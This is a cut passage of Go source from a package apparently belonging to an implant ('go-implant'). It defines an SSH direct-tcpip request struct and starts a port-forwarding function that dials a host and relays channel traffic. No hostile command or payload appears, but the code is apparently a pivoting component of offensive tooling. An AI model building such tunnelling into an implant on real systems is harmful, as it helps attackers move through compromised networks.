package ssh

import (
	"go-implant/client/config"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"

	"golang.org/x/crypto/ssh"
)

// DirectTcpipOpenRequest is a struct to hold extradata regarding port forwards
type DirectTcpipOpenRequest struct {
	HostToConnect       string
	PortToConnect       uint32
	OriginatorIPAddress string
	OriginatorPort      uint32
}

// ServePortForward is a function to forward traffic coming from channel to host:port
func ServePortForward(connection ssh.Channel, host string, port int) {

	// Connect to remote host
	remote, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
	if err != nil {
		connection.Close()
		if config.DEBUG {
			log.Println(err)
		}
		ret